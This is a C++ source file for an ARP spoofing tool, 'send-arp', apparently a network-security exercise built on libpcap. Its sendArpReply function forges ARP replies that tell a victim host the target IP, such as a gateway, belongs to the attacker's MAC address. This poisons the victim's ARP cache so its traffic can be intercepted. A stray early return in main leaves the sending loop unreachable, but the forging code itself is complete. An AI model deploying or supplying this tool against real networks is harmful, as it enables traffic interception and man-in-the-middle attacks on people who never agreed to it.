#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "util.h"

void usage();
int sendArpReply(char *dev, Mac *attacker_mac, Ip *attacker_ip, Mac *sender_mac, Ip *sender_ip, Ip *target_ip);

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];

    Mac attacker_mac;
	Ip attacker_ip;
	if (
		getMacFromInterface(dev, &attacker_mac) ||
		getIpFromInterface(dev, &attacker_ip)
	) {
		fprintf(stderr, "getMacFromInterface or getIpFromInterface error\n");
		return -1;
	}

	printf("Attacker MAC: %s\n", std::string(attacker_mac).c_str());
	printf("Attacker IP: %s\n", std::string(attacker_ip).c_str());

	return 0;
    for (int i = 2; i < argc; i += 2) {
		Ip sender_ip = Ip(argv[i]);
		Ip target_ip = Ip(argv[i + 1]);
		Mac sender_mac;
		getMacFromIP(dev, &attacker_mac, &attacker_ip, &sender_ip, &sender_mac);
		sendArpReply(dev, &attacker_mac, &attacker_ip, &sender_mac, &sender_ip, &target_ip);
    }
}

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int sendArpReply(char *dev, Mac *attacker_mac, Ip *attacker_ip, Mac *sender_mac, Ip *sender_ip, Ip *target_ip) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = *sender_mac;
	packet.eth_.smac_ = *attacker_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = *attacker_mac;
	packet.arp_.sip_ = htonl(*target_ip);
	packet.arp_.tmac_ = *sender_mac;
	packet.arp_.tip_ = htonl(*sender_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		pcap_close(handle);
		return -1;
	}

	pcap_close(handle);
	return 0;
}